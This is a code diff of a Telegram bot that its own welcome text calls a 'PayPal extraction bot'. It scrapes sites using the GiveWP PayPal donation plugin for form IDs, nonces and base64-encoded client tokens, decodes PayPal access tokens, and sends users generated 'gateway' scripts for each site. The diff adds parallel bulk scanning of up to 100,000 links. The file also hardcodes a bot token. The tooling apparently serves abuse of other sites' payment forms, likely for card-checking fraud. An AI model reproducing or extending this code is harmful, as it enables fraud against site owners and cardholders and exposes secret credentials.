@@ -3,6 +3,7 @@ import time
 import threading
 import gc
 from telebot import types
+from telebot import apihelper
 import requests, random, json, string, re, base64
 from datetime import datetime, timedelta
 import os
@@ -12,8 +13,10 @@ from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
 import signal
 import sys
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import traceback
+from requests.exceptions import ReadTimeout, ConnectionError
+from queue import Queue
 
 # === بيانات البوت ===
 token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
@@ -23,6 +26,13 @@ myid = ['6843321125']
 admins = ['6843321125']
 OWNER_ID = 6843321125
 
+# === إعدادات API مع إعادة المحاولة ===
+apihelper.SESSION_TIMEOUT = 30
+apihelper.READ_TIMEOUT = 30
+apihelper.RETRY_ON_ERROR = True
+apihelper.RETRY_TIMEOUT = 5
+apihelper.RETRY_COUNT = 5
+
 # === متغيرات عامة ===
 waiting_users = {}
 reply_mode = {}
@@ -30,8 +40,14 @@ bulk_waiting = {}
 stop_flags = {}
 processing_status = {}
 
-# === Thread Pool للتحكم في الموارد ===
-executor = ThreadPoolExecutor(max_workers=5)
+# === Thread Pool محسن للملفات الكبيرة ===
+executor = ThreadPoolExecutor(max_workers=20)  # زيادة العمال
+
+# === إعدادات الملفات الكبيرة ===
+MAX_LINKS_PER_FILE = 100000  # الحد الأقصى للروابط
+BATCH_SIZE = 1000  # حجم الدفعة للفحص
+MAX_WORKERS_FOR_CHECK = 15  # عدد العمال للفحص المتوازي
+UPDATE_INTERVAL = 500  # تحديث الرسالة كل 500 رابط
 
 def cleanup_memory():
     """تنظيف الذاكرة"""
@@ -69,7 +85,6 @@ def start(message):
         Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
         FRA.add(Yes22)
         
-        # استخدام رابط صورة مباشر بدلاً من فيديو
         bot.send_message(message.chat.id, IU, parse_mode='HTML', reply_markup=FRA)
     except Exception as e:
         print(f"Error in start: {e}")
@@ -129,7 +144,13 @@ def back_to_start(call):
     try:
         user_id = call.from_user.id
         userr = call.from_user.first_name
-        IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a>'''
+        IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a> 𝑻𝒉𝒊𝒔 𝒊𝒔 𝒂 𝑷𝒂𝒚𝑷𝒂𝒍 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒃𝒐𝒕.
+
+[<a href="https://t.me/nnunrr">ϟ</a>] PayPal Gateway >> /paypal 
+[<a href="https://t.me/nnunrr">ϟ</a>] Bulk Extract >> /bulk
+[<a href="https://t.me/nnunrr">ϟ</a>] Send Feedback >> Button Below
+
+[<a href="https://t.me/nnunrr">ϟ</a>] 𝐷𝑒𝑣: @nnunrr '''
         FRA = types.InlineKeyboardMarkup(row_width=2)
         Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
         FRA.add(Yes22)
@@ -172,7 +193,6 @@ def paypal_command(message):
             )
             return
 
-        # استخدام جلسة جديدة
         session = requests.Session()
         session.headers.update({"User-Agent": generate_user_agent()})
         
@@ -193,7 +213,6 @@ def paypal_command(message):
                 text="Gate found ✅ Extracting data..."
             )
 
-            # استخراج البيانات
             res = r.text
             
             id_form1_match = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
@@ -234,7 +253,6 @@ This site doesn't have PayPal Give plugin''',
             USER_URL2 = f'https://{parsed.netloc}'
             USER_URL = parsed.path
 
-            # إنشاء الطلب
             headers = {
                 'origin': USER_URL2,
                 'referer': USER_URL,
@@ -282,7 +300,6 @@ This site doesn't have PayPal Give plugin''',
                 text=f"✅ Gateway extracted successfully!\nGenerating file..."
             )
 
-            # توليد الكود
             text_content = generate_gateway_code_single(link, id_form1, id_form2, nonec, au, tok)
 
             file_name = f'@nnunrr_{message.from_user.id}.py'
@@ -482,12 +499,15 @@ def stop_bulk_file(message):
         user_id = message.from_user.id
         parts = message.text.split()
         if len(parts) > 1:
-            file_num = int(parts[1])
-            if user_id in stop_flags and file_num in stop_flags[user_id]:
-                stop_flags[user_id][file_num] = True
-                bot.reply_to(message, f"🛑 Stopping File #{file_num}...")
-            else:
-                bot.reply_to(message, f"❌ File #{file_num} not found.")
+            try:
+                file_num = int(parts[1])
+                if user_id in stop_flags and file_num in stop_flags[user_id]:
+                    stop_flags[user_id][file_num] = True
+                    bot.reply_to(message, f"🛑 Stopping File #{file_num}...")
+                else:
+                    bot.reply_to(message, f"❌ File #{file_num} not found.")
+            except:
+                bot.reply_to(message, "Invalid file number.")
         else:
             if user_id in stop_flags:
                 for key in stop_flags[user_id]:
@@ -519,14 +539,64 @@ def handle_bulk_file(message):
     try:
         user_id = message.from_user.id
         if user_id in bulk_waiting:
-            executor.submit(process_bulk_file, message)
+            executor.submit(process_bulk_file_optimized, message)
         else:
             bot.reply_to(message, "Use /bulk first to start bulk extraction.")
     except Exception as e:
         print(f"Error in handle_bulk_file: {e}")
 
-def process_bulk_file(message):
-    """معالجة ملف الروابط"""
+def check_link(link):
+    """فحص رابط واحد"""
+    session = None
+    try:
+        if not link.startswith(("http://", "https://")):
+            return None
+        
+        session = requests.Session()
+        session.headers.update({"User-Agent": generate_user_agent()})
+        
+        r = session.get(link, timeout=10)
+        if r.status_code != 200:
+            session.close()
+            return None
+        
+        res = r.text
+        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
+        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res)
+        nonec = re.search(r'name="give-form-hash" value="(.*?)"', res)
+        anc = re.search(r'"data-client-token":"(.*?)"', res)
+        
+        if not all([id_form1, id_form2, nonec, anc]):
+            session.close()
+            return None
+        
+        id_form1 = id_form1.group(1)
+        id_form2 = id_form2.group(1)
+        nonec = nonec.group(1)
+        enc = anc.group(1)
+        dec = base64.b64decode(enc).decode('utf-8')
+        au_match = re.search(r'"accessToken":"(.*?)"', dec)
+        if not au_match:
+            session.close()
+            return None
+        au = au_match.group(1)
+        
+        session.close()
+        
+        return {
+            'link': link,
+            'id_form1': id_form1,
+            'id_form2': id_form2,
+            'nonec': nonec,
+            'au': au
+        }
+    except:
+        if session:
+            session.close()
+        return None
+
+def process_bulk_file_optimized(message):
+    """نسخة محسنة للملفات الكبيرة"""
     try:
         user_id = message.from_user.id
         chat_id = message.chat.id
@@ -537,14 +607,28 @@ def process_bulk_file(message):
 
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
-        links = downloaded_file.decode('utf-8').splitlines()
-        links = [link.strip() for link in links if link.strip()]
-
+        
+        # قراءة الروابط بكفاءة
+        links = []
+        for line in downloaded_file.decode('utf-8', errors='ignore').splitlines():
+            link = line.strip()
+            if link and link.startswith(("http://", "https://")):
+                links.append(link)
+        
         if not links:
-            bot.reply_to(message, "❌ File is empty.")
+            bot.reply_to(message, "❌ File is empty or no valid links found.")
             return
 
         total = len(links)
+        
+        # تحذير للملفات الكبيرة
+        if total > 10000:
+            bot.send_message(chat_id, f"""⚠️ <b>Large file detected!</b>
+━━━━━━━━━━━━━━━━━━
+📌 Total Links: {total}
+⏱️ Estimated time: {int(total * 0.5 / 60)} minutes
+━━━━━━━━━━━━━━━━━━
+Processing will continue in background...""", parse_mode="HTML")
         
         if user_id not in stop_flags:
             stop_flags[user_id] = {}
@@ -569,106 +653,51 @@ def process_bulk_file(message):
 🛑 /stop {file_num} to stop this file""", parse_mode="HTML")
         
         live_count = 0
-        
-        def check_link(link):
-            session = None
-            try:
-                if not link.startswith(("http://", "https://")):
-                    return None
-                
-                session = requests.Session()
-                session.headers.update({"User-Agent": generate_user_agent()})
-                
-                r = session.get(link, timeout=10)
-                if r.status_code != 200:
-                    session.close()
-                    return None
-                
-                res = r.text
-                id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
-                id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res)
-                nonec = re.search(r'name="give-form-hash" value="(.*?)"', res)
-                anc = re.search(r'"data-client-token":"(.*?)"', res)
-                
-                if not all([id_form1, id_form2, nonec, anc]):
-                    session.close()
-                    return None
-                
-                id_form1 = id_form1.group(1)
-                id_form2 = id_form2.group(1)
-                nonec = nonec.group(1)
-                enc = anc.group(1)
-                dec = base64.b64decode(enc).decode('utf-8')
-                au_match = re.search(r'"accessToken":"(.*?)"', dec)
-                if not au_match:
-                    session.close()
-                    return None
-                au = au_match.group(1)
-                
-                session.close()
-                
-                return {
-                    'link': link,
-                    'id_form1': id_form1,
-                    'id_form2': id_form2,
-                    'nonec': nonec,
-                    'au': au
-                }
-            except:
-                if session:
-                    session.close()
-                return None
-        
         stopped = False
+        live_links = []
         
-        for idx, link in enumerate(links, 1):
+        # فحص الروابط بالدفعات
+        for batch_start in range(0, total, BATCH_SIZE):
             if user_id in stop_flags and file_num in stop_flags[user_id] and stop_flags[user_id][file_num]:
                 stopped = True
                 break
             
-            result = check_link(link)
+            batch_end = min(batch_start + BATCH_SIZE, total)
+            batch_links = links[batch_start:batch_end]
             
-            with processing_status[f"{user_id}_{file_num}"]['lock']:
-                processing_status[f"{user_id}_{file_num}"]['processed'] += 1
+            # فحص متوازي للدفعة
+            with ThreadPoolExecutor(max_workers=MAX_WORKERS_FOR_CHECK) as check_executor:
+                futures = {check_executor.submit(check_link, link): link for link in batch_links}
                 
-                if result:
-                    processing_status[f"{user_id}_{file_num}"]['live'] += 1
-                    live_count += 1
+                for future in as_completed(futures):
+                    if user_id in stop_flags and file_num in stop_flags[user_id] and stop_flags[user_id][file_num]:
+                        stopped = True
+                        break
                     
-                    try:
-                        code = generate_gateway_code_bulk(result, live_count, file_num)
-                        file_name = f'gateway_{file_num}_{live_count}_{user_id}.py'
-                        with open(file_name, 'w', encoding='utf-8') as f:
-                            f.write(code)
-                        with open(file_name, 'rb') as f:
-                            bot.send_document(
-                                chat_id,
-                                f,
-                                caption=f"""✅ <b>File #{file_num} - Gateway #{live_count}</b>
-━━━━━━━━━━━━━━━━━━━━
-🔗 Link: <code>{result['link']}</code>
-━━━━━━━━━━━━━━━━━━━━
-Dev: @nnunrr""",
-                                parse_mode="HTML"
-                            )
-                        os.remove(file_name)
-                        time.sleep(0.3)
-                    except Exception as e:
-                        print(f"Error sending file: {e}")
-                else:
-                    processing_status[f"{user_id}_{file_num}"]['dead'] += 1
-                
-                processed = processing_status[f"{user_id}_{file_num}"]['processed']
-                live = processing_status[f"{user_id}_{file_num}"]['live']
-                dead = processing_status[f"{user_id}_{file_num}"]['dead']
-                progress = int((processed / total) * 100)
-                
-                if processed % 10 == 0 or processed == total:
-                    bar_length = 20
-                    filled = int((progress / 100) * bar_length)
-                    bar = '█' * filled + '░' * (bar_length - filled)
+                    result = future.result()
                     
-                    text = f"""📊 <b>File #{file_num} - Scanning links...</b>
+                    with processing_status[f"{user_id}_{file_num}"]['lock']:
+                        processing_status[f"{user_id}_{file_num}"]['processed'] += 1
+                        
+                        if result:
+                            processing_status[f"{user_id}_{file_num}"]['live'] += 1
+                            live_links.append(result)
+                        else:
+                            processing_status[f"{user_id}_{file_num}"]['dead'] += 1
+                        
+                        processed = processing_status[f"{user_id}_{file_num}"]['processed']
+                        
+                        # تحديث الرسالة كل UPDATE_INTERVAL رابط
+                        if processed % UPDATE_INTERVAL == 0 or processed == total:
+                            live = processing_status[f"{user_id}_{file_num}"]['live']
+                            dead = processing_status[f"{user_id}_{file_num}"]['dead']
+                            progress = int((processed / total) * 100)
+                            
+                            bar_length = 20
+                            filled = int((progress / 100) * bar_length)
+                            bar = '█' * filled + '░' * (bar_length - filled)
+                            
+                            text = f"""📊 <b>File #{file_num} - Scanning links...</b>
 ━━━━━━━━━━━━━━━━━━
 📌 Total Links: {total}
 ✅ Live: {live}
@@ -677,13 +706,40 @@ Dev: @nnunrr""",
 ━━━━━━━━━━━━━━━━━━
 ⏱️ Checked {processed} of {total}
 🛑 /stop {file_num} to stop this file"""
-                    
-                    try:
-                        bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
-                    except:
-                        pass
+                            
+                            try:
+                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
+                            except:
+                                pass
             
-            time.sleep(0.2)
+            if stopped:
+                break
+        
+        # إرسال الملفات live
+        if live_links:
+            bot.send_message(chat_id, f"✅ Found {len(live_links)} live links! Generating files...", parse_mode="HTML")
+            
+            for idx, result in enumerate(live_links, 1):
+                try:
+                    code = generate_gateway_code_bulk(result, idx, file_num)
+                    file_name = f'gateway_{file_num}_{idx}_{user_id}.py'
+                    with open(file_name, 'w', encoding='utf-8') as f:
+                        f.write(code)
+                    with open(file_name, 'rb') as f:
+                        bot.send_document(
+                            chat_id,
+                            f,
+                            caption=f"""✅ <b>File #{file_num} - Gateway #{idx}</b>
+━━━━━━━━━━━━━━━━━━━━
+🔗 Link: <code>{result['link']}</code>
+━━━━━━━━━━━━━━━━━━━━
+Dev: @nnunrr""",
+                            parse_mode="HTML"
+                        )
+                    os.remove(file_name)
+                    time.sleep(0.5)
+                except Exception as e:
+                    print(f"Error sending file: {e}")
         
         status = processing_status[f"{user_id}_{file_num}"]
         
@@ -727,7 +783,7 @@ Dev: @nnunrr"""
         cleanup_memory()
             
     except Exception as e:
-        print(f"Error in process_bulk_file: {e}")
+        print(f"Error in process_bulk_file_optimized: {e}")
         traceback.print_exc()
         cleanup_memory()
 
@@ -874,12 +930,17 @@ def block_user(message):
         if str(message.from_user.id) not in admins:
             bot.reply_to(message, "You do not have permission.")
             return
-        user_id_to_block = message.text.split()[1]
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, "Usage: /block2 [user_id]")
+            return
+        user_id_to_block = parts[1]
         with open('blockusers.txt', 'a') as file:
             file.write(f"{user_id_to_block}\n")
         bot.reply_to(message, f"✅ User ID {user_id_to_block} blocked.")
-    except:
-        bot.reply_to(message, "Usage: /block2 [user_id]")
+    except Exception as e:
+        print(f"Error in block_user: {e}")
+        bot.reply_to(message, "Error blocking user.")
 
 @bot.message_handler(commands=['unblock2'])
 def unblock_user(message):
@@ -887,7 +948,11 @@ def unblock_user(message):
         if str(message.from_user.id) not in admins:
             bot.reply_to(message, "You do not have permission.")
             return
-        user_id_to_unblock = message.text.split()[1]
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, "Usage: /unblock2 [user_id]")
+            return
+        user_id_to_unblock = parts[1]
         with open('blockusers.txt', 'r') as file:
             lines = file.readlines()
         with open('blockusers.txt', 'w') as file:
@@ -895,8 +960,9 @@ def unblock_user(message):
                 if line.strip() != user_id_to_unblock:
                     file.write(line)
         bot.reply_to(message, f"✅ User ID {user_id_to_unblock} unblocked.")
-    except:
-        bot.reply_to(message, "Usage: /unblock2 [user_id]")
+    except Exception as e:
+        print(f"Error in unblock_user: {e}")
+        bot.reply_to(message, "Error unblocking user.")
 
 # === تشغيل البوت ===
 print('✅ Bot is running...')
@@ -904,12 +970,25 @@ print('✅ Bot is running...')
 if __name__ == '__main__':
     while True:
         try:
-            bot.infinity_polling(none_stop=True, interval=1, timeout=30)
+            bot.polling(none_stop=False, interval=1, timeout=30)
         except KeyboardInterrupt:
-            print('Bot stopped by user')
-            break
+            print('🛑 Bot stopped by user')
+            executor.shutdown(wait=False)
+            sys.exit(0)
+        except ReadTimeout:
+            print('⚠️ ReadTimeout - إعادة الاتصال...')
+            time.sleep(3)
+            continue
+        except ConnectionError:
+            print('⚠️ ConnectionError - إعادة المحاولة...')
+            time.sleep(5)
+            continue
+        except apihelper.ApiTelegramException as e:
+            print(f'❌ API Error: {e}')
+            time.sleep(5)
+            continue
         except Exception as e:
-            print(f'❌ Error: {e}')
+            print(f'❌ Unexpected Error: {e}')
             traceback.print_exc()
             cleanup_memory()
             time.sleep(5)
